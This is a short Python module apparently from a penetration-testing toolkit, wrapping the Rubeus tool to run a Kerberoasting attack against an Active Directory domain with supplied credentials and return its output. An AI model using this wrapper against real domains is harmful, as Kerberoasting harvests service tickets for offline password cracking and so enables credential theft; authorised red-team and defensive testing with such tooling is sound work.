"""Rubeus wrapper for Kerberos attacks"""

import subprocess
from typing import Dict, Any, Optional


class RubeusWrapper:
    """Wrapper for Rubeus"""
    
    @staticmethod
    def kerberoast(domain: str, username: str, password: str) -> Dict[str, Any]:
        """Perform Kerberoasting"""
        
        cmd = ["Rubeus.exe", "kerberoast", "/domain:" + domain, "/user:" + username, "/password:" + password]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr
        }